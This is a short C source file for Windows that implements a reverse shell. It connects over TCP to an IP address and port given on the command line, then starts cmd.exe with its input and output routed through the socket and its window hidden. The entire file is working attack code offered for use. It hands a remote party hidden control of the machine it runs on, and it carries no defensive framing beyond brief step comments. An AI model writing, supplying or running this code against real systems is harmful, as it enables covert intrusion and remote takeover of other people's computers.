#include <winsock2.h>
#include <WS2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	SOCKET sock;
	struct sockaddr_in server;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi;

	if (argc != 3)
	{
		printf("Usage: reverseshell ipv4 port");
		return EXIT_FAILURE;
	}

	// Step 1. initialize WSA
	WSAStartup(MAKEWORD(1, 0), &wsaData);
	sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	// Step 2. Connect to server
	server.sin_family = AF_INET;
	inet_pton(AF_INET, argv[1], &server.sin_addr.s_addr);
	server.sin_port = htons(atoi(argv[2]));

	WSAConnect(sock, (const PSOCKADDR)&server, sizeof(server), NULL, NULL, NULL, NULL);

	// Step 3. Re-wire stdin/stdout/stderr, and tell it to hide window
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
	si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	si.wShowWindow = SW_HIDE;	// already 0
	si.cb = sizeof(si);

	// Step 4. Spawn shell
	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	// be careful with CreateProcessW!

	return EXIT_SUCCESS;
}